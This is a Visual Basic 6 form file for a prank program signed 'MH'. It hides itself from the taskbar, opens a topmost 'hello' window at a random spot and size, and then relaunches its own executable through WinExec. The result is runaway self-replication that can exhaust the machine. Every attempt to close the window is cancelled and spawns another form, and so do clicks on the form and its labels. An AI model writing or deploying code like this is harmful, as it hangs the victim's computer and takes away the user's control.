VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "hello"
   ClientHeight    =   3090
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3090
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  '窗口缺省
   Begin VB.Label Label3 
      Caption         =   "hahamadeby MH"
      Height          =   255
      Left            =   3360
      TabIndex        =   2
      Top             =   2880
      Width           =   1335
   End
   Begin VB.Label Label2 
      Caption         =   "hello"
      BeginProperty Font 
         Name            =   "宋体"
         Size            =   72
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   1695
      Left            =   480
      TabIndex        =   1
      Top             =   480
      Width           =   3855
   End
   Begin VB.Label Label1 
      Caption         =   "hello"
      BeginProperty Font 
         Name            =   "宋体"
         Size            =   72
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1815
      Left            =   8520
      TabIndex        =   0
      Top             =   4080
      Width           =   3735
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function WinExec Lib "kernel32" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Sub Form_Load()
Me.Hide
App.TaskVisible = False
Dim x, y, cx, cy As Long
Randomize Timer
Sleep 100
Randomize Timer + Rnd() * 55
y = Int((Screen.Height / Screen.TwipsPerPixelY) * Rnd() + 1)
Sleep 100
Randomize Timer + Rnd() * 55
x = Int((Screen.Width / Screen.TwipsPerPixelX) * Rnd() + 1)
Sleep 100
Randomize Timer + Rnd() * 55
cy = Int((Screen.Height / Screen.TwipsPerPixelY) * Rnd() + 1)
Sleep 100
Randomize Timer + Rnd() * 55
cx = Int((Screen.Width / Screen.TwipsPerPixelX) * Rnd() + 1)
'If SetWindowPos(Me.hwnd, -1, 0, 0, 0, 0, 2 + 1) = False Then
If SetWindowPos(Me.hwnd, -1, x, y, cx, cy, 0) = False Then
MsgBox "Failed"
'End
End If
Me.Show
WinExec App.Path + "\" + App.EXEName + ".exe", 1
End Sub

Private Sub Form_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
Set form2new = New Form2
form2new.Show
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
Set form2new = New Form2
form2new.Show
Cancel = -1
End Sub

Private Sub Form_Unload(Cancel As Integer)
Set form2new = New Form2
form2new.Show
Cancel = -1
End Sub

Private Sub Label2_Click()
Set form2new = New Form2
form2new.Show
End Sub

Private Sub Label3_Click()
Set form2new = New Form2
form2new.Show
End Sub
